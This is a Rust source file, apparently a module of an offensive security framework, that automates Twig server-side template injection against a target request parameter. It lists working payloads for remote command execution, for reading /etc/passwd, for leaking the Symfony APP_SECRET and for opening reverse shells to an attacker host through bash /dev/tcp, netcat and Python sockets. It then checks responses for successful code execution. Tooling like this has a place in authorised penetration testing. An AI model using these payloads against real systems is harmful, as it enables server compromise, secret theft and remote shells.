use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct TwigModule;

impl TwigModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self, context: &ModuleContext) -> Vec<String> {
        let lhost = context.get_option("LHOST").map(|s| s.as_str()).unwrap_or("ATTACKER_IP");
        let lport = context.get_option("LPORT").map(|s| s.as_str()).unwrap_or("4444");
        
        vec![
            // Detection payloads
            "{{7*7}}".to_string(),
            "{{7*'7'}}".to_string(),
            "{{\"Hello\"~\"World\"}}".to_string(),
            
            // Basic RCE via PHP filter
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}".to_string(),
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}".to_string(),
            "{{_self.env.registerUndefinedFilterCallback(\"passthru\")}}{{_self.env.getFilter(\"whoami\")}}".to_string(),
            
            // File read
            "{{'/etc/passwd'|file_excerpt(1,30)}}".to_string(),
            
            // Reverse shells
            format!("{{{{_self.env.registerUndefinedFilterCallback(\"exec\")}}}}{{{{_self.env.getFilter(\"bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\")}}}}",lhost, lport),
            format!("{{{{_self.env.registerUndefinedFilterCallback(\"system\")}}}}{{{{_self.env.getFilter(\"nc {} {} -e /bin/sh\")}}}}",lhost, lport),
            format!("{{{{_self.env.registerUndefinedFilterCallback(\"exec\")}}}}{{{{_self.env.getFilter(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{}\\\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\")}}}}",lhost, lport),
            
            // Alternative RCE
            "{{_self.env.enableDebug()}}{{_self.env.isDebug()}}".to_string(),
            "{{app.request.server.all|join(',')}}".to_string(),
            
            // Symfony-specific
            "{{app.request.query.all}}".to_string(),
            "{{app.request.server.get('APP_SECRET')}}".to_string(),
            
            // Map filter RCE
            "{{['id']|map('system')|join}}".to_string(),
            "{{['whoami']|map('passthru')|join}}".to_string(),
            "{{['cat /etc/passwd']|map('system')|join}}".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for TwigModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/ssti/twig".to_string(),
            name: "Twig SSTI Exploitation".to_string(),
            category: "SSTI".to_string(),
            description: "Server-Side Template Injection exploitation for Twig (PHP/Symfony). Uses filter callbacks and map functions for RCE.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig".to_string(),
                "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
            "LHOST (attacker IP)".to_string(),
            "LPORT (attacker port)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let payloads = self.get_payloads(context);
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 15,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        let results = engine.inject_batch(request, injection_point, &payloads).await?;
        
        let mut findings = Vec::new();
        
        for result in &results {
            if result.response_body.contains("49") || result.response_body.contains("7777777") || result.response_body.contains("HelloWorld") {
                findings.push(format!("Template evaluation detected: {}", result.payload));
            }
            
            if result.response_body.contains("uid=") || result.response_body.contains("root:") {
                findings.push(format!("Command execution successful: {}", result.payload));
            }
            
            if result.response_body.contains("APP_SECRET") || result.response_body.contains("KERNEL_DIR") {
                findings.push(format!("Symfony configuration disclosure: {}", result.payload));
            }
            
            if result.analysis.has_error_indicators && result.response_body.to_lowercase().contains("twig") {
                findings.push(format!("Twig error detected: {}", result.payload));
            }
        }
        
        Ok(ExecutionResult {
            success: !findings.is_empty(),
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
